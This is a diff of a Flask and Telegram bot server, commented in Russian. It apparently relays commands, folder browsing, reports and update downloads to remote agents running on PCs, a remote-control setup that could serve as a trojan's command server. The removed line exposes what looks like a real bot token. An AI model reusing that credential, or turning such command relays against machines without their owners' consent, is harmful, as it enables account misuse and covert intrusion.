@@ -5,12 +5,12 @@ import telebot
 from telebot import types
 from flask import Flask, request, jsonify, send_from_directory
 
-# Настройка логирования для отслеживания в консоли Render
+# Настройка логирования, которая точно пишется в консоль Render
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+logger = logging.getLogger('gunicorn.error')
 
 # === КОНФИГУРАЦИЯ ===
-BOT_TOKEN = "8889355917:AAEPQcy1eLySvKBQgk0M23tANZoIpR3VU34"  # <--- ВСТАВЬ СЮДА СВОЙ ТОКЕН!
+BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"  # <--- ВСТАВЬ СЮДА СВОЙ ТОКЕН!
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
@@ -22,6 +22,9 @@ last_reports = {}
 UPDATE_DIR = os.path.join(os.getcwd(), "updates")
 if not os.path.exists(UPDATE_DIR):
     os.makedirs(UPDATE_DIR)
+
+# Переменная для контроля единичного запуска бота
+bot_initialized = False
 
 # === ЛОГИКА TELEGRAM БОТА ===
 
@@ -129,24 +132,29 @@ def handle_callbacks(call):
     bot.answer_callback_query(call.id)
 
 def run_bot_polling():
-    logger.info("Инициализация bot.infinity_polling...")
+    logger.info("=== ИНИЦИАЛИЗАЦИЯ BOT.INFINITY_POLLING ===")
     try:
+        # Проверяем токен перед запуском
+        me = bot.get_me()
+        logger.info(f"=== УСПЕШНО АВТОРИЗОВАН: @{me.username} ===")
         bot.infinity_polling(skip_pending=True)
     except Exception as e:
-        logger.error(f"Ошибка в работе циклического опроса бота: {e}")
-
-# === ЖЕЛЕЗОБЕТОННЫЙ ЗАПУСК ПОТОКА БОТА ДЛЯ GUNICORN ===
-# Код выполняется при импорте модуля веб-сервером, обходя блок __main__
-print("=== СТАРТ ПОТОКА ТЕЛЕГРАМ БОТА ===", flush=True)
-bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
-bot_thread.start()
-
+        logger.error(f"!!! КРИТИЧЕСКАЯ ОШИБКА БОТА: {e} !!!", exc_info=True)
 
 # === ЛОГИКА ВЕБ-СЕРВЕРА FLASK ===
 
+@app.before_request
+def init_bot_on_first_request():
+    global bot_initialized
+    if not bot_initialized:
+        bot_initialized = True
+        logger.info("=== ПЕРВЫЙ ЗАПРОС ПРИНЯТ. ЗАПУСКАЮ ПОТОК БОТА ===")
+        t = threading.Thread(target=run_bot_polling, daemon=True)
+        t.start()
+
 @app.route('/', methods=['GET'])
 def index():
-    return "<h1>Server is Live!</h1><p>Бот и сервер успешно запущены на Render.</p>", 200
+    return "<h1>Server is Live!</h1><p>Бот и сервер запущены.</p>", 200
 
 @app.route('/poll', methods=['POST'])
 def poll():
@@ -157,18 +165,15 @@ def poll():
     if not host_id or not user_id: 
         return jsonify({"error": "Missing host_id or user_id"}), 400
     
-    # Обновляем базу данных активных хостов
     hosts_db[host_id] = {
         "user_id": user_id, 
         "current_dir": data.get("current_dir", ""),
         "status": data.get("status", "online")
     }
     
-    # Если агент прислал текстовый отчет
     if data.get("report"):
         bot.send_message(user_id, f"✅ Отчет от ПК `{host_id}`:\n\n{data['report']}", parse_mode="Markdown")
         
-    # Если агент сообщил, что данные папки/дисков готовы к отрисовке
     if data.get("event_type") == "explorer_ready":
         markup = types.InlineKeyboardMarkup(row_width=1)
         items = data.get("items", [])
@@ -182,16 +187,14 @@ def poll():
             text = f"Папка: `{current_dir}`\n\nВыберите элемент:"
             markup.add(types.InlineKeyboardButton("⬅️ Назад (Вверх)", callback_data="explore_back_"))
             
-            # Выводим первые 10 папок, чтобы не превышать лимиты кнопок Telegram
             for item in items[:10]:
                 if item.get("is_dir"):
                     markup.add(types.InlineKeyboardButton(f"📁 {item['name']}", callback_data=f"explore_cd_{item['name']}"))
                     
         bot.send_message(user_id, text, reply_markup=markup, parse_mode="Markdown")
 
-    # Вытаскиваем команды из очереди для передачи их агенту
     cmds = commands_queue.get(host_id, [])
-    commands_queue[host_id] = [] # Очищаем очередь команд
+    commands_queue[host_id] = []
     
     return jsonify({
         "status": "ok", 
@@ -223,7 +226,6 @@ def get_update():
         return send_from_directory(UPDATE_DIR, filename, as_attachment=True)
     return "No update file found", 404
 
-# Блок локального запуска (для тестов на ПК, Render его пропустит)
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
